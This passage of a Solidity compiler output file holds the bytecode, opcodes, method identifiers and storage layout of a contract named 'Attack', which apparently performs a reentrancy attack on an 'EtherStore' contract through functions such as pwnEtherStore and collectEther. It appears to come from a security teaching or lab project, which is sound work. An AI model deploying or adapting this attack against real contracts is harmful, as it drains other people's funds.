925082820190508082111561050a5761050961042b565b5b9291505056fea2646970667358221220605fb530670fd421458decabf3c1dd2bac239e69a90d1c63e5c69ebe13411c5764736f6c634300081a0033",
					"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x40 MLOAD PUSH2 0x64D CODESIZE SUB DUP1 PUSH2 0x64D DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE DUP2 ADD SWAP1 PUSH2 0x25 SWAP2 SWAP1 PUSH2 0xCF JUMP JUMPDEST DUP1 PUSH0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP SELFBALANCE PUSH1 0x1 DUP2 SWAP1 SSTORE POP POP PUSH2 0xFA JUMP JUMPDEST PUSH0 DUP1 REVERT JUMPDEST PUSH0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x9E DUP3 PUSH2 0x75 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0xAE DUP2 PUSH2 0x94 JUMP JUMPDEST DUP2 EQ PUSH2 0xB8 JUMPI PUSH0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 MLOAD SWAP1 POP PUSH2 0xC9 DUP2 PUSH2 0xA5 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0xE4 JUMPI PUSH2 0xE3 PUSH2 0x71 JUMP JUMPDEST JUMPDEST PUSH0 PUSH2 0xF1 DUP5 DUP3 DUP6 ADD PUSH2 0xBB JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x546 DUP1 PUSH2 0x107 PUSH0 CODECOPY PUSH0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x49 JUMPI PUSH0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x6289D385 EQ PUSH2 0x4D JUMPI DUP1 PUSH4 0xA9E10BF2 EQ PUSH2 0x57 JUMPI DUP1 PUSH4 0xACD2E6E5 EQ PUSH2 0x61 JUMPI DUP1 PUSH4 0xB69EF8A8 EQ PUSH2 0x8B JUMPI DUP1 PUSH4 0xFF11E1DB EQ PUSH2 0xB5 JUMPI JUMPDEST PUSH0 DUP1 REVERT JUMPDEST PUSH2 0x55 PUSH2 0xCB JUMP JUMPDEST STOP JUMPDEST PUSH2 0x5F PUSH2 0x20A JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x6C JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH2 0x75 PUSH2 0x2F8 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x82 SWAP2 SWAP1 PUSH2 0x3E1 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x96 JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH2 0x9F PUSH2 0x31B JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0xAC SWAP2 SWAP1 PUSH2 0x412 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0xC0 JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH2 0xC9 PUSH2 0x321 JUMP JUMPDEST STOP JUMPDEST PUSH8 0xDE0B6B3A7640000 CALLVALUE LT ISZERO PUSH2 0xDF JUMPI PUSH0 DUP1 REVERT JUMPDEST PUSH0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xE2C41DBC PUSH8 0xDE0B6B3A7640000 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x14C JUMPI PUSH0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x15E JUMPI RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP POP CALLVALUE PUSH1 0x1 PUSH0 DUP3 DUP3 SLOAD PUSH2 0x174 SWAP2 SWAP1 PUSH2 0x458 JUMP JUMPDEST SWAP3 POP POP DUP2 SWAP1 SSTORE POP PUSH0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x155DD5EE PUSH8 0xDE0B6B3A7640000 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x1DB SWAP2 SWAP1 PUSH2 0x4C4 JUMP JUMPDEST PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x1F2 JUMPI PUSH0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x204 JUMPI RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH8 0xDE0B6B3A7640000 PUSH0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND BALANCE GT ISZERO PUSH2 0x2DE JUMPI PUSH0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x155DD5EE PUSH8 0xDE0B6B3A7640000 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x2B0 SWAP2 SWAP1 PUSH2 0x4C4 JUMP JUMPDEST PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x2C7 JUMPI PUSH0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x2D9 JUMPI RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP JUMPDEST CALLVALUE PUSH1 0x1 PUSH0 DUP3 DUP3 SLOAD PUSH2 0x2EF SWAP2 SWAP1 PUSH2 0x4DD JUMP JUMPDEST SWAP3 POP POP DUP2 SWAP1 SSTORE POP JUMP JUMPDEST PUSH0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH1 0x1 SLOAD DUP2 JUMP JUMPDEST CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x8FC SELFBALANCE SWAP1 DUP2 ISZERO MUL SWAP1 PUSH1 0x40 MLOAD PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH2 0x364 JUMPI RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x3A9 PUSH2 0x3A4 PUSH2 0x39F DUP5 PUSH2 0x367 JUMP JUMPDEST PUSH2 0x386 JUMP JUMPDEST PUSH2 0x367 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x3BA DUP3 PUSH2 0x38F JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x3CB DUP3 PUSH2 0x3B0 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x3DB DUP2 PUSH2 0x3C1 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x3F4 PUSH0 DUP4 ADD DUP5 PUSH2 0x3D2 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x40C DUP2 PUSH2 0x3FA JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x425 PUSH0 DUP4 ADD DUP5 PUSH2 0x403 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH0 MSTORE PUSH1 0x11 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH0 REVERT JUMPDEST PUSH0 PUSH2 0x462 DUP3 PUSH2 0x3FA JUMP JUMPDEST SWAP2 POP PUSH2 0x46D DUP4 PUSH2 0x3FA JUMP JUMPDEST SWAP3 POP DUP3 DUP3 SUB SWAP1 POP DUP2 DUP2 GT ISZERO PUSH2 0x485 JUMPI PUSH2 0x484 PUSH2 0x42B JUMP JUMPDEST JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x4AE PUSH2 0x4A9 PUSH2 0x4A4 DUP5 PUSH2 0x48B JUMP JUMPDEST PUSH2 0x386 JUMP JUMPDEST PUSH2 0x3FA JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x4BE DUP2 PUSH2 0x494 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x4D7 PUSH0 DUP4 ADD DUP5 PUSH2 0x4B5 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH2 0x4E7 DUP3 PUSH2 0x3FA JUMP JUMPDEST SWAP2 POP PUSH2 0x4F2 DUP4 PUSH2 0x3FA JUMP JUMPDEST SWAP3 POP DUP3 DUP3 ADD SWAP1 POP DUP1 DUP3 GT ISZERO PUSH2 0x50A JUMPI PUSH2 0x509 PUSH2 0x42B JUMP JUMPDEST JUMPDEST SWAP3 SWAP2 POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 PUSH1 0x5F 0xB5 ADDRESS PUSH8 0xFD421458DECABF3 0xC1 0xDD 0x2B 0xAC 0x23 SWAP15 PUSH10 0xA90D1C63E5C69EBE1341 SHR JUMPI PUSH5 0x736F6C6343 STOP ADDMOD BYTE STOP CALLER "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "270000",
						"executionCost": "infinite",
						"totalCost": "infinite"
					},
					"external": {
						"balance()": "2469",
						"collectEther()": "infinite",
						"etherStore()": "infinite",
						"pwnEtherStore()": "infinite",
						"recieve()": "infinite"
					}
				},
				"methodIdentifiers": {
					"balance()": "b69ef8a8",
					"collectEther()": "ff11e1db",
					"etherStore()": "acd2e6e5",
					"pwnEtherStore()": "6289d385",
					"recieve()": "a9e10bf2"
				}
			},
			"storageLayout": {
				"storage": [
					{
						"astId": 5,
						"contract": "contract/Attack.sol:Attack",
						"label": "etherStore",
						"offset": 0,
						"slot": "0",
						"type": "t_contract(EtherStore)253"
					},
					{
						"astId": 7,
						"contract": "contract/Attack.sol:Attack",
						"label": "balance",
						"offset": 0,
						"slot": "1",
						"type": "t_uint256"
					}
				],
				"types": {
					"t_contract(EtherStore)253": {
						"encoding": "inplace",
						"label": "contract EtherStore",
						"numberOfBytes": "20"
					},
					"t_uint256": {
						"encoding": "inplace",
						"label": "uint256",
						"numberOfBytes": "32"
					}
				}
			},
			"userdoc": {
				"kind": "user",
				"methods": {},
				"version": 1
			}
		}
	}
}